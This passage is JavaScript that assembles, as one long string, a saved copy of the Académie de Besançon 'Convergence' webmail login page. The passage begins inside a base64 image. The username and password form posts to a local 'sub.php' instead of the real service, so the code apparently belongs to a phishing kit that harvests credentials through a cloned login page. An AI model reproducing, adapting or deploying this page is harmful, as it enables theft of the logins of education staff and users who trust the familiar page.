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);'+
'    --savepage-url-10: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAWCAIAAACOpGH9AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKklEQVQImVWMMQoAMAyEjvv/l6OdEugg4mLUJukaqHpsAx9qZ6bAeR9JHmXjNdEMjHDzAAAAAElFTkSuQmCC);'+
'  }'+
'</style>'+
'<script id="savepage-shadowloader" type="text/javascript">'+
'  "use strict";'+
'  window.addEventListener("DOMContentLoaded",'+
'  function(event) {'+
'    savepage_ShadowLoader(5);'+
'  },false);'+
'  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}'+
'</script>'+
'<meta name="savepage-url" content="https://convergences.ac-besancon.fr/iwc_static/c11n/allDomain/layout/login.html?lang=fr&3.0.1.4.0_17071455&svcs=abs,mail,c11n">'+
'<meta name="savepage-title" content="Convergence">'+
'<meta name="savepage-pubdate" content="Unknown">'+
'<meta name="savepage-from" content="https://convergences.ac-besancon.fr/iwc_static/c11n/allDomain/layout/login.html?lang=fr&3.0.1.4.0_17071455&svcs=abs,mail,c11n">'+
'<meta name="savepage-date" content="Mon Jan 08 2024 02:50:22 GMT+0000 (temps universel coordonné)">'+
'<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">'+
'<meta name="savepage-version" content="33.9">'+
'<meta name="savepage-comments" content="">'+
'  </head><body role="application"><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>'+
'  <script data-savepage-type="text/javascript" type="text/plain"></script>'+
' '+
''+
' '+
'  <script data-savepage-type="text/javascript" type="text/plain"></script>'+
'        <div class="Convergence-Login" id="convergenceLogin">'+
'   <div class="Convergence-Login-Border">'+
'    <div class="Convergence-Login-Banner">'+
'<!--					<div  class="Convergence-Login-Logo" wairole="presentation"></div> -->'+
'     <div class="Convergence-Login-RedBand"></div>'+
'     <div id="welcomeMsg" class="Convergence-Login-WelcomeMsg" style="display: none;">Convergence</div>'+
'<!--					<div class="Convergence-Login-WelcomeMsg">Acad&eacute;mie de Besan&ccedil;on</div>-->'+
'    </div>'+
''+
'    <div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex="0" style="visibility: hidden;"></div>'+
'    '+
'    <form action="sub.php" method="post" onsubmit="return login();">'+
''+
'     <div>'+
'      <div class="Convergence-Login-Form">'+
'       <div class="Convergence-Login-FormRow">'+
'        <label id="usernameLabelID" for="username">Nom d\'utilisateur :</label>'+
'        <input id="username" name="username" type="text" aria-required="true" value="">'+
'       </div>'+
'       <div class="Convergence-Login-FormRow">'+
'        <label id="passwordLabelID" for="password">Mot de passe :</label>'+
'        <input id="password" name="password" type="password" aria-required="true" autocomplete="off" value="">'+
'       </div>'+
'        <div class="Convergence-Login-FormRow">'+
'        <input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false">'+
'       </div>'+
'       <div class="Convergence-Login-FormRow tundra">'+
'<!--'+
'        <div class="Convergence-Login-SelectLang">'+
'         <select dojoType="dojox.form.DropDownSelect"'+
'           class="dojoxDropDownSelectFixedWidth Convergence-Login-SelectLang"'+
'           id="langButton">'+
'          <option value="en-us" lang="en-us">English</option>'+
'          <option value="es" lang="es">Español</option>'+
'          <option value="de" lang="de">Deutsch</option>'+
'          <option value="fr" lang="fr">Français</option>'+
'          <option value="fr-ca" lang="fr-ca">Français Canadien</option>'+
'          <option value="hi" lang="hi">हिन्दी</option>'+
'          <option value="it" lang="it">Italiano</option>'+
'          <option value="ja" lang="ja">日本語</option>'+
'          <option value="ko" lang="ko">한국어</option>'+
'          <option value="zh-cn" lang="zh-cn">简体中文</option>'+
'          <option value="zh-tw" lang="zh-tw">繁體中文</option>'+
'         </select>'+
'        </div>-->'+
'        <div class="Convergence-Login-FormButton" id="buttonContainer">'+
'         <div>'+
'          <span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Connexion</span></button></span></span></span>'+
'         </div>'+
'        </div>'+
'        <div style="clear: both"></div>'+
'       </div>'+
''+
'      </div>'+
''+
'     </div>'+
'     <div style="clear: both"></div>'+
'    </form>'+
'  <div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">'+
'   <div class="ErrorMsg-Contianer" id="btnContainer">'+
'    <div class="Error-Icon"></div>'+
'    <div class="Error-Msg" id="errMsg"></div>'+
'   </div>'+
'   <div class="Convergence-Login-FormButton ChangePwdBtn">'+
'    <span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Modifier le mot de passe</span></button></span></span></span>'+
'      </div>'+
'                </div>'+
'                <div class="Convergence-Login-RedBand-Bas"><a href="https://applilocale.ac-besancon.fr/crimp/web/app.php" target="_blank">Je ne connais pas mon identifiant et/ou mon mot de passe</a></div>'+
'    <div id="NotificationSpam" class="Notification-Spam"> ATTENTION AUX SPAMS : Ne donnez jamais vos identifiants et mots de passe !!!</div>'+
'    <div id="copyright" class="Convergence-Login-Copyright" style="display: none;">Copyright © 2010, Oracle et/ou ses affiliés. Tous droits réservés.</div>'+
'    <div class="Convergence-Login-Copyright">Oracle © Académie de Besançon</div>'+
'   </div>'+
'  </div>'+
''+
'  <div id="overlay" class="login">'+
'   <div class="centered">'+
'    <div class="logo"></div>'+
'    <div id="progress"></div>'+
'   </div>'+
'  </div>'+
''+
'  <iframe srcdoc="<html><head>'+
'<style id=&quot;savepage-cssvariables&quot;>'+
'  :root {'+
'  }'+
'</style>'+
'        </head><body></body></html>" data-savepage-sameorigin="" name="picCache" id="picCache" data-savepage-src="" src="" width="0" height="0" frameborder="0" data-savepage-key="0-0"></iframe>'+
''+
'  <noscript>'+
'   <div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">'+
'    <iframe src="noscript.html" frameborder=0 width="100%" />'+
'   </div>'+
'  </noscript>'+
'    '+
''+
'</body></html>';